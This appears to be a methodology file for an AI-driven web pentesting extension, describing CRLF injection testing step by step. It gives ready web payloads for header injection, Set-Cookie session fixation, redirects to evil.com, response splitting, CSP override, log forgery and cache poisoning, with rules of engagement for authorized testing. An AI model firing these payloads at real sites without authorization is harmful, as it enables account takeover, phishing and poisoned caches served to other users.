---
name: "crlf-injection"
description: "CRLF Injection — HTTP response splitting via %0d%0a, Set-Cookie injection, redirect poisoning, XSS via injected headers, log injection, cache poisoning"
version: "1.0.0"
author: "void-extension"
tags: ["pentest", "injection", "crlf", "response-splitting", "header-injection", "log-injection", "cache-poisoning", "redirect"]
trigger_patterns:
  - "/crlf-injection"
  - "/crlf"
  - "crlf injection"
  - "header injection"
  - "response splitting"
  - "http response splitting"
  - "log injection"
  - "%0d%0a"
  - "carriage return line feed"
---

# CRLF Injection

CRLF injection exploits the fact that HTTP responses are text-based and
delimited by carriage return + line feed sequences (`\r\n`, URL-encoded as
`%0d%0a`). When user-supplied data is written into HTTP response headers without
sanitisation, an attacker can inject additional headers or even a complete second
response body — a technique called **HTTP response splitting**.

The impact ranges from cookie injection and XSS to full cache poisoning and
phishing via redirect hijacking. CRLF is frequently overlooked because modern
frameworks auto-escape headers, but legacy code paths, reverse proxies, and
custom redirect handlers remain vulnerable.

## Scope and preconditions

Any endpoint that reflects user input into a response header is a candidate:
- Redirect handlers (`Location:` header)
- Cookie setters (`Set-Cookie:` header)
- Custom headers that echo request values
- Log files that include request data

## Rules of engagement

- Test with your own accounts and sessions only.
- When confirming cache poisoning via CRLF, use a cache-buster to prevent
  polluting production cached content.
- Record confirmed findings with `add_pentest_finding`.

## Workflow

- [ ] 1. Identify injection points
- [ ] 2. Test basic CRLF injection
- [ ] 3. Test Set-Cookie injection
- [ ] 4. Test redirect poisoning
- [ ] 5. Test XSS via injected headers
- [ ] 6. Test log injection
- [ ] 7. Chain with cache poisoning
- [ ] 8. Report findings

## Step 1: Identify injection points

CRLF injection requires a user-controlled value to reach a response header.
Common injection vectors:

| Vector | Example |
|--------|---------|
| Redirect `next` parameter | `/login?next=/dashboard` → `Location: /dashboard` |
| `Host` header reflected | `Host: evil.com` → custom header |
| `Referer` header logged | Reflected in X-Forwarded-Referer |
| Language / locale param | `?lang=en` → `Set-Cookie: lang=en` |
| URL path component | `/app/en/page` → `Location: /app/en/page/` |
| Username / display name | Reflected in `X-Username:` header |
| Callback URL | OAuth redirect_uri |

Use `get_response_headers` to check which headers contain reflected user input.
Use `search_responses` to find any header value that echoes a request parameter.

## Step 2: Basic CRLF injection

The fundamental test is to inject a newline sequence and see if a new header
appears in the response.

### Payload variants

Try each encoding. Different servers and proxy layers decode differently:

| Encoding | Payload |
|----------|---------|
| Standard URL-encoding | `%0d%0a` |
| Double URL-encoded | `%250d%250a` |
| Unicode | `%u000d%u000a` |
| Carriage return only | `%0d` |
| Line feed only | `%0a` |
| CRLF + space (header continuation) | `%0d%0a%20` |
| Mixed case encoding | `%0D%0A` |

### Test: reflected in redirect

If the app redirects to a user-supplied path:
```
GET /redirect?url=https://example.com/%0d%0aX-Injected-Header:%20test HTTP/1.1
```

Expected vulnerable response:
```
HTTP/1.1 302 Found
Location: https://example.com/
X-Injected-Header: test
```

Use `send_request` to send this and `get_response_headers` to check the
response headers. If `X-Injected-Header: test` appears, CRLF injection is
confirmed — **High**.

### Test: reflected in custom header

```
GET /page?lang=en%0d%0aX-Injected:%20void HTTP/1.1
```

Check `get_response_headers` for `X-Injected: void`.

## Step 3: Set-Cookie injection

If the injection point reaches a header output, you can inject a
`Set-Cookie` header to plant an attacker-controlled cookie in the victim's
browser.

### Attack payload

```
GET /set-lang?lang=en%0d%0aSet-Cookie:%20session=ATTACKER_TOKEN;%20Path=/ HTTP/1.1
```

Expected response:
```
HTTP/1.1 200 OK
Set-Cookie: lang=en
Set-Cookie: session=ATTACKER_TOKEN; Path=/
```

**Impact**: If the victim visits this URL (e.g., via a phishing link), the
attacker's cookie is planted. Combined with session fixation (where the app
accepts a session from the cookie without regenerating it post-login), this
yields account takeover.

**Severity**: High (cookie injection) to Critical (cookie injection + fixation).

### Cookie attribute injection

You can also append security-stripping attributes to an existing cookie:
```
GET /login?next=/%0d%0aSet-Cookie:%20session=LEGIT;%20HttpOnly=false HTTP/1.1
```

This can strip `HttpOnly` or `Secure` from a cookie, making it readable by
JavaScript or transmittable over HTTP.

## Step 4: Redirect poisoning

Inject a `Location` header to create an open redirect that bypasses allowlist
checks.

### If the app checks the redirect destination

Suppose the app validates that `next` starts with `/`:
```
/login?next=/%0d%0aLocation:%20https://evil.com
```

The original `Location:` header points to `/`, but the injected one overrides
it in some proxy configurations.

### Full response splitting

In older HTTP/1.1 servers, injecting `\r\n\r\n` creates a second HTTP response:

```
GET /redirect?url=/%0d%0a%0d%0a<html>Phishing%20content</html> HTTP/1.1
```

The server sends one response; the browser sees two. The second "response" is
the injected HTML. This is the origin of the "HTTP Response Splitting" attack
name.

**Note**: This vector is rare in HTTP/2 (binary framing prevents it) but still
applies to HTTP/1.1 keep-alive connections through proxies.

## Step 5: XSS via injected headers

If the application reflects response headers into the page body (e.g., an
error page that shows the `Referer` header, or a CSP report endpoint), CRLF
can lead to reflected XSS.

### Attack: inject Content-Type to enable XSS

If the app returns a page with `Content-Type: text/plain` and you can inject
headers:
```
GET /error?msg=foo%0d%0aContent-Type:%20text/html HTTP/1.1
```

Now the response is parsed as HTML. If `msg` is also reflected in the body,
inject HTML tags for XSS.

### Attack: inject CSP bypass

If the application sets a CSP via the response header:
```
GET /page?x=y%0d%0aContent-Security-Policy:%20default-src%20* HTTP/1.1
```

Injecting a permissive CSP overrides the original if the injected header
comes after it (server-specific behaviour — test both orderings).

### Attack: inject Set-Cookie → XSS escalation

If the application reads a cookie value and reflects it into the page:
1. Inject `Set-Cookie: display_name=<script>alert(1)</script>` via CRLF.
2. The victim visits the page; the injected cookie value is reflected unsanitised.
3. XSS executes.

## Step 6: Log injection

If user-supplied data is written to application logs without sanitisation, CRLF
injection can forge log entries — inserting fake entries that appear legitimate
or that break log parsers.

### Detection

Check any parameter that appears in error messages or audit records. Use
`send_request` with a payload that would look like a separate log line:
```
GET /login?user=admin%0a[2026-01-01 00:00:00] INFO User admin logged in successfully HTTP/1.1
```

**Impact**: Forged log entries can frame other users, hide attack tracks, or
cause SIEM false positives. Severity is typically **Low** for standalone log
injection, **Medium** if combined with log viewer XSS.

## Step 7: Chain with cache poisoning

CRLF injection becomes a cache poisoning attack when the injected header causes
the cache to store a poisoned response. Combine with the `cache` skill:

1. Identify a CRLF injection in a cacheable path.
2. Inject a header that changes the response (e.g., `Location:`, `Content-Type:`,
   or a body via response splitting).
3. Send WITHOUT a cache-buster so the poisoned response is cached.
4. Verify from a clean session that the poisoned response is served.

**Severity**: Critical if CRLF + cache = stored XSS served to all visitors.

### Example: CRLF → X-Forwarded-Host → cache poisoning

Some applications reflect `X-Forwarded-Host` into asset URLs. If you can
inject `X-Forwarded-Host: evil.com` via CRLF in a cached response, the result
is equivalent to cache poisoning via unkeyed header (see `cache` skill).

## Test payload summary

| Target | Payload |
|--------|---------|
| Basic header injection | `?param=value%0d%0aX-Test:%20injected` |
| Cookie injection | `?param=value%0d%0aSet-Cookie:%20evil=1` |
| Redirect override | `?url=/%0d%0aLocation:%20https://evil.com` |
| Response splitting (HTTP/1.1) | `?param=val%0d%0a%0d%0a<html>` |
| CSP override | `?x=y%0d%0aContent-Security-Policy:%20default-src%20*` |
| Double-encoded | `?param=value%250d%250aX-Test:%20injected` |
| Unicode-encoded | `?param=value%u000d%u000aX-Test:%20injected` |

Use `get_payloads` to retrieve framework-specific CRLF payload lists if
available.

## Severity reference

| Finding | Severity |
|---------|----------|
| CRLF → response splitting → stored XSS via cache | Critical |
| CRLF → Set-Cookie → session fixation | Critical |
| CRLF → XSS via injected Content-Type | High |
| CRLF → cookie injection (no fixation) | High |
| CRLF → open redirect via Location injection | Medium |
| CRLF → log injection only | Low |
| CRLF → header injection, no exploitable impact | Informational |

## Known false positives

- Some frameworks strip `\r\n` silently — confirm the injected header actually
  appears in the response with `get_response_headers`, not just by checking
  the status code.
- HTTP/2 connections cannot be split (binary framing) — focus on HTTP/1.1
  paths or proxy hops that downgrade to HTTP/1.1.
- A `%0a` (LF only) injection may inject a header on some servers but not
  others. Always test both `%0d%0a` and `%0a`.

## Tooling note

This methodology uses Void panel tools: `send_request` for sending CRLF
payloads in parameters and headers, `get_response_headers` for verifying
injected headers appear in responses, `compare_responses` for baseline diffing,
`search_responses` for finding reflection points, `get_payloads` for
framework-specific payload lists, and `add_pentest_finding` to record confirmed
results. These are browser-extension APIs, not shell commands — do not attempt
to run CLI tools.
